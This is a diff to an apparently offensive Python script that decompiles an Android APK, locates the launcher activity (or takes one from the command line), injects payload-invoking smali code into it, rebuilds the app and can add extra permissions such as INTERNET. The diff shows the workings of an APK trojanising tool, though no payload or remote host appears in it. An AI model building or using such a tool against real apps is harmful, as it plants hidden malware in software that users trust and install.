@@ -60,7 +60,7 @@ def initialize():
 	cwd = os.getcwd()
 
 	#NOW WE NEED TO DECOMPILE THE APPLICATION
-	command = ["apktool", "d", ""+cwd+"/"+sys.argv[1]]
+	command = ["apktool", "d","-f","-r", ""+cwd+"/"+sys.argv[1]]
 	p = subprocess.Popen(command, stdout=subprocess.PIPE)
 	result = p.communicate()[0]
 
@@ -76,29 +76,33 @@ def initialize():
 
 def parseAndroidManifest():
 	print "[*] ANALYZING ANDROID MANIFEST"
-	global targetFolder
-	file = targetFolder+"/AndroidManifest.xml"
-
-	handler = open(file).read()
-	soup = Soup(handler,"lxml")
-	activities= soup.find_all('activity-alias')
-	activities+=soup.find_all('activity')
-	foundLAUNCHER=0
-	for activity in activities:
-		if "LAUNCHER" in str(activity):
-			foundLAUNCHER=1
-			global activityToTarget
-			if "android:targetactivity" in str(activity).lower():
-				activityToTarget= str(activity['android:targetactivity'])
-			elif "android:name" in str(activity).lower():
-				activityToTarget= str(activity['android:name'])
-			else:
-				print "[+] ERROR IDENTIFYING TARGET ACTIVITY"
-
-	if foundLAUNCHER==1:
-		print "[+] TARGET ACTIVIY: "+activityToTarget
+	if len(sys.argv) <= 6:
+		global targetFolder
+		file = targetFolder+"/AndroidManifest.xml"
+		print "[DEBUG] Attempting to find MAIN"
+		handler = open(file).read()
+		soup = Soup(handler,"lxml")
+		activities = soup.find_all('activity-alias')
+		activities+=soup.find_all('activity')
+		foundLAUNCHER=0
+		for activity in activities:
+			if "LAUNCHER" in str(activity):
+				foundLAUNCHER=1
+				global activityToTarget
+				if "android:targetactivity" in str(activity).lower():
+					activityToTarget= str(activity['android:targetactivity'])
+				elif "android:name" in str(activity).lower():
+					activityToTarget= str(activity['android:name'])
+				else:
+					print "[+] ERROR IDENTIFYING TARGET ACTIVITY"
+		if foundLAUNCHER==1:
+			print "[+] TARGET ACTIVIY: "+activityToTarget
+		else:
+			print "[+] NO LAUNCHER FOUND, PLEASE SPECIFY A TARGET CLASS"
+			sys.exit()
 	else:
-		print "[+] NO LAUNCHER FOUND!!!!!"
+		print "[*] USING CUSTOM ACTIVITY: "+sys.argv[6]
+		activityToTarget=sys.argv[6]
 
 def readPayloads():
 	print "[*] PREPARING PAYLOADS"
@@ -196,7 +200,6 @@ def injectIntoActivity():
 		if all(x in line.lower() for x in checkStrings):
 			stringDataToWriteIntoNewActivity+=stringInvokePayload
 			f.close()
-	# pathToFile=targetFolder+"/smali/"+activityToTarget.replace('.','/')+'.smali'
 	newInjectFile = open(pathToFile, "w")
 	newInjectFile.write(stringDataToWriteIntoNewActivity)
 	newInjectFile.close()
@@ -232,7 +235,7 @@ def buildAgain():
 def injectCrazyPermissions():
 	print "[+] CHECKING IF ADDITIONAL PERMS TO BE ADDED"
 
-	if "yes" in sys.argv[4]:
+	if "yes" in sys.argv[5]:
 		print "[*] INJECTION OF CRAZY PERMISSIONS TO BE DONE!"
 		stringCrazyPermissions='\n<uses-permission android:name="android.permission.INTERNET" />'
 		stringCrazyPermissions+='\n<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />'
